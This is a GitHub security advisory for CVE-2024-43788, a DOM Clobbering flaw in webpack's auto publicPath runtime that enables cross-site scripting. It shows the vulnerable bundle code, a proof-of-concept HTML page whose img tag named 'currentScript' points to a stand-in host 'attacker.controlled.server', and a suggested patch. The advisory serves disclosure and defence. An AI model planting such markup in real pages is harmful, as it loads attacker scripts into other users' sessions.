# [M] Webpack's AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS

## Summary
Severity: Medium
Advisory: GHSA-4vvj-4cpr-p986
CVE: CVE-2024-43788
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2024-08-27
Source: https://github.com/advisories/GHSA-4vvj-4cpr-p986
Type: github-advisory

## Affected
- npm: `webpack` — affected >=5.0.0-alpha.0 <5.94.0

## Details
### Summary

We discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.

We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.


### Details

#### Backgrounds

DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:

[1] https://scnps.co/papers/sp23_domclob.pdf
[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/


#### Gadgets found in Webpack

We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript)
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
```

However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.

### PoC

Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.

Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:

```
// entry.js
import('./import1.js')
  .then(module => {
    module.hello();
  })
  .catch(err => {
    console.error('Failed to load module', err);
  });
```

```
// import1.js
export function hello () {
  console.log('Hello');
}
```

The webpack.config.js is set up as follows:
```
const path = require('path');

module.exports = {
  entry: './entry.js', // Ensure the correct path to your entry file
  output: {
    filename: 'webpack-gadgets.bundle.js', // Output bundle file
    path: path.resolve(__dirname, 'dist'), // Output directory
    publicPath: "auto", // Or leave this field not set
  },
  target: 'web',
  mode: 'development',
};
```

When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.

```
<!DOCTYPE html>
<html>
<head>
  <title>Webpack Example</title>
  <!-- Attacker-controlled Script-less HTML Element starts--!>
  <img name="currentScript" src="https://attacker.controlled.server/"></img>
  <!-- Attacker-controlled Script-less HTML Element ends--!>
</head>
<script src="./dist/webpack-gadgets.bundle.js"></script>
<body>
</body>
</html>
```

### Impact

This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.

### Patch

A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174

```
/******/ 	/* webpack/runtime/publicPath */
/******/ 	(() => {
/******/ 		var scriptUrl;
/******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + "";
/******/ 		var document = __webpack_require__.g.document;
/******/ 		if (!scriptUrl && document) {
/******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>
/******/ 				scriptUrl = document.currentScript.src;
/******/ 			if (!scriptUrl) {
/******/ 				var scripts = document.getElementsByTagName("script");
/******/ 				if(scripts.length) {
/******/ 					var i = scripts.length - 1;
/******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;
/******/ 				}
/******/ 			}
/******/ 		}
/******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration
/******/ 		// or pass an empty string ("") and set the __webpack_public_path__ variable from your code to use your own logic.
/******/ 		if (!scriptUrl) throw new Error("Automatic publicPath is not supported in this browser");
/******/ 		scriptUrl = scriptUrl.replace(/#.*$/, "").replace(/\?.*$/, "").replace(/\/[^\/]+$/, "/");
/******/ 		__webpack_require__.p = scriptUrl;
/******/ 	})();
```

Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.

## References
- https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
- https://nvd.nist.gov/vuln/detail/CVE-2024-43788
- https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270
- https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61
- https://github.com/webpack/webpack
- https://research.securitum.com/xss-in-amp4email-dom-clobbering
- https://scnps.co/papers/sp23_domclob.pdf
